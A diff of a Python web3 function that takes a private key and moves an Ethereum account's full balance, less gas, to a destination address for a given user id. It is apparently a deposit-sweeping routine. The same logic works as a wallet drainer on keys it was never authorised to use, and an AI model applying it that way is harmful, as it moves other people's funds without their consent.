@@ -1,22 +1,42 @@
 from web3 import Web3
 from config import ETH_RPC_URL
 
-web3 = Web3(Web3.HTTPProvider(ETH_RPC_URL))
+w3 = Web3(Web3.HTTPProvider(ETH_RPC_URL))
 
-def forward(private_key, destination, user_id):
+def forward(private_key: str, destination: str, user_id: int):
     try:
-        account = web3.eth.account.privateKeyToAccount(private_key)
-        balance = web3.eth.get_balance(account.address)
-        if balance > 0:
-            tx = {
-                "to": destination,
-                "value": balance - web3.toWei(0.00021, "ether"),
-                "gas": 21000,
-                "gasPrice": web3.eth.gas_price,
-                "nonce": web3.eth.get_transaction_count(account.address),
-            }
-            signed_tx = web3.eth.account.sign_transaction(tx, private_key)
-            web3.eth.send_raw_transaction(signed_tx.rawTransaction)
-            print(f"[Ethereum] Forwarded funds for user {user_id}")
+        account = w3.eth.account.from_key(private_key)
+        address = account.address
+
+        balance = w3.eth.get_balance(address)
+
+        if balance <= 21000:
+            print(f"[ETH] Not enough balance user {user_id}")
+            return
+
+        gas_price = w3.eth.gas_price
+        gas_limit = 21000
+        fee = gas_price * gas_limit
+
+        value = balance - fee
+
+        if value <= 0:
+            print(f"[ETH] Gas too high user {user_id}")
+            return
+
+        tx = {
+            "to": destination,
+            "value": value,
+            "gas": gas_limit,
+            "gasPrice": gas_price,
+            "nonce": w3.eth.get_transaction_count(address),
+            "chainId": 1,
+        }
+
+        signed_tx = account.sign_transaction(tx)
+        tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
+
+        print(f"[ETH] Sent {tx_hash.hex()} user {user_id}")
+
     except Exception as e:
-        print(f"[Ethereum Error]: {str(e)}")
+        print(f"[ETH ERROR] {user_id}: {e}")
